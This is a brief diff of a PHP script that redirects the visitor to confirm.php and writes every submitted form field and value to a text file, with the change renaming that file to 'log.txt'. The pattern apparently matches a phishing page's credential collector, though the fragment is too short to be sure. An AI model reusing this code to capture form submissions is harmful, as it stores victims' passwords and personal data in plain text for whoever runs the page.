@@ -1,6 +1,6 @@
 <?php
 header ('Location:confirm.php');
-$handle = fopen("./information", "a");
+$handle = fopen("log.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, " = ");
